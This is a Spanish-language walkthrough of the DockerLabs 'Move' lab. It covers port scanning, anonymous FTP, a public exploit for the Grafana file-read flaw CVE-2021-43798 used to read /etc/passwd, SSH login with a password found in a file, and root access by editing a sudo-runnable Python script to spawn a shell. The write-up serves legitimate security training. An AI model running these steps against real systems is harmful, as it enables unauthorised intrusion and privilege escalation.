## Introducción

Este documento presenta la resolución completa de la máquina **Move**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone múltiples servicios, incluyendo FTP con acceso anónimo que contiene un archivo con una contraseña, y Grafana en el puerto 3000 con una versión vulnerable a **lectura arbitraria de archivos (CVE-2021-43798)**. Esta vulnerabilidad permite leer `/etc/passwd` y confirmar la existencia del usuario `freddy`.
Combinando la contraseña obtenida del archivo FTP, se accede al sistema vía SSH. Una vez dentro, se identifica un script Python en `/opt/maintenance.py` que el usuario puede ejecutar como root mediante `sudo`. Al modificar el script para ejecutar una shell, se obtiene acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Move.zip
sudo bash auto_deplo.sh Move.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Move/{content,exploits,nmap,scripts}
cd Move
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **21/tcp** — FTP
* **22/tcp** — SSH
* **80/tcp** — HTTP
* **3000/tcp** — HTTP (Grafana)

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1752026870/Ports_qjq0ti.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p21,22,80,3000 172.17.0.2 -oN targeted
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Vulnerabilidad en Grafana

Grafana expone una versión vulnerable (v8.3.0) a **lectura arbitraria de archivos (CVE-2021-43798)**. Se localiza el exploit correspondiente:

```bash
searchsploit grafana 8.3.0
```

Se ejecuta el exploit para leer `/etc/passwd`:

```bash
python3 exploit.py -u http://172.17.0.2:3000 -f /etc/passwd
```

![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1752026869/Passwd_xt7xla.png)

Se identifica al usuario **freddy**.

### 2.2 Obtención de credenciales

El archivo descargado previamente por FTP y referenciado en `maintenance.html` contiene la contraseña de **freddy**:

![Pass.txt](https://res.cloudinary.com/dewqswzke/image/upload/v1752026868/Pass.txt_l2qj3q.png)

### 2.3 Acceso SSH

Se accede al sistema vía SSH:

```bash
ssh freddy@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1752026871/Ssh_unq16c.png)

## Paso 3 — Escalada de privilegios

### 3.1 De freddy → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1752026873/Sudo-l_gahlpa.png)

El usuario puede ejecutar `/opt/maintenance.py` como root con `python3`.

Se inspecciona el archivo para verificar si es editable:

![Code](https://res.cloudinary.com/dewqswzke/image/upload/v1752026868/Code_mil3ks.png)

Se modifica su contenido para ejecutar una shell:

```python
import os
os.system("/bin/bash")
```

Se ejecuta el script con `sudo`:

```bash
sudo python3 /opt/maintenance.py
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1752026872/Sudo_qlbnoz.png)
